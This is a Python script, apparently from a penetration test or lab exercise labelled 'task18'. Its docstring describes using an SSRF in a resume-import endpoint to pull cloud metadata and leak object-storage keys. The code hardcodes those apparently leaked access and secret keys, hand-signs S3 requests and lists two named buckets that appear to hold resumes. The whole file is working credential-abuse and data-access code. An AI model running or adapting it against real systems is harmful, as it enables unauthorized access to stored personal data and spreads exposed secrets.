"""List the S3 buckets leaked via task18's SSRF, using their creds directly.

Approach: the SSRF in POST /api/seeker/resume/import reflects a server-side
fetch of an arbitrary http(s) URL. Pointed at the Yandex Cloud metadata IMDSv1
bridge (169.254.169.254/latest/user-data, no Metadata-Flavor header needed),
it leaks the instance cloud-init, including the backend's .env with
STORAGE_ACCESS_KEY/STORAGE_SECRET_KEY. Those are plain Yandex Object Storage
(S3-compatible) credentials, so once leaked they need no further exploitation:
this script hand-rolls an AWS SigV4 GET (stdlib only, no boto3) against each
known bucket's virtual-hosted endpoint and lists its contents directly.
"""

import datetime
import hashlib
import hmac
import urllib.error
import urllib.request

ACCESS = "YCAJE6hJjOgIlF3PuygPg3FVu"
SECRET = "YCPNni3w1j_GOTNT_tpBs2CWGxZZxqW1GYsKNw06"
REGION = "ru-central1"
HOST = "storage.yandexcloud.net"
SERVICE = "s3"


def sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()


def sigkey(k, d, r, s):
    kd = sign(("AWS4" + k).encode(), d)
    kr = sign(kd, r)
    ks = sign(kr, s)
    return sign(ks, "aws4_request")


def req(bucket, params=""):
    method = "GET"
    canonical_uri = "/"
    host = f"{bucket}.{HOST}"
    now = datetime.datetime.now(datetime.UTC)
    amzdate = now.strftime("%Y%m%dT%H%M%SZ")
    datestamp = now.strftime("%Y%m%d")
    payload_hash = hashlib.sha256(b"").hexdigest()
    canonical_headers = f"host:{host}\nx-amz-content-sha256:{payload_hash}\nx-amz-date:{amzdate}\n"
    signed_headers = "host;x-amz-content-sha256;x-amz-date"
    canonical_request = f"{method}\n{canonical_uri}\n{params}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    scope = f"{datestamp}/{REGION}/{SERVICE}/aws4_request"
    string_to_sign = (
        f"AWS4-HMAC-SHA256\n{amzdate}\n{scope}\n"
        + hashlib.sha256(canonical_request.encode()).hexdigest()
    )
    k = sigkey(SECRET, datestamp, REGION, SERVICE)
    sig = hmac.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = f"AWS4-HMAC-SHA256 Credential={ACCESS}/{scope}, SignedHeaders={signed_headers}, Signature={sig}"
    url = f"https://{host}/" + ("?" + params if params else "")
    r = urllib.request.Request(
        url,
        headers={
            "Authorization": auth,
            "x-amz-date": amzdate,
            "x-amz-content-sha256": payload_hash,
        },
    )
    try:
        resp = urllib.request.urlopen(r, timeout=20)
        return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}: " + e.read().decode(errors="replace")[:600]
    except Exception as e:
        return "ERR " + str(e)


for b in ["medhunter-resumes-6d6c314a", "medhunter-results-6d6c314a"]:
    print("====== bucket", b, "======")
    print(req(b, "list-type=2")[:2000])
    print()
